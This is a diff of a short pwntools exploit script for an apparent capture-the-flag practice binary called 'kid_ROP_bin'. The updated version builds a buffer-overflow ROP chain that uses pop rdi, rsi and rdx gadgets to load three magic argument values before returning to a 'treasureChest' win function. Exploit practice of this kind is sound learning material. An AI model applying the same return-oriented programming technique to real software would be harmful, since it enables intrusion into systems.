@@ -4,25 +4,27 @@ from pwn import *
 p = process("./kid_ROP_bin")
 context.binary = "./kid_ROP_bin"
 
-# address of win function
-win_addr = p64(0x400537)
+# ROP gadgets
+pop_rdi = 0x4008c3 # pop rdi
+pop_rsi = 0x4008c1 # pop rsi, pop r15
+pop_rdx = 0x4007f7 # pop rdx 
 
-# ROP gadget addresses
-rdi_addr = p64(0x400603)
-rsi_addr = p64(0x400601)
+# address of treasureChest 
+win = 0x400727
 
-# payload = 
-# padding
-# pop rdi + argument 1
-# pop rsi + argument 2 + pop r15 (we dont need r15)
-# pop rdx + argument 3
-# return to win
+# offer
+payload = b'A' * 72
 
-payload = b'A' * 40
-payload += rdi_addr + p64(0x1337)
-payload += rsi_addr + p64(0xdead) + p64(0)
-payload += win_addr 
+# ---------------------- ROP chain ---------------------------
+# pop rdi + key1
+# pop rsi + key2 + 0 (no need for r15)
+# pop rdx
+# address of treasureChest
+payload += p64(pop_rdi) + p64(0x13371337)
+payload += p64(pop_rsi) + p64(0xdeadbeef) + p64(0)
+payload += p64(pop_rdx) + p64(0xc0ff33)
+payload += p64(win)
 
-# send payload
+# send and receive output
 p.sendline(payload)
 p.interactive()
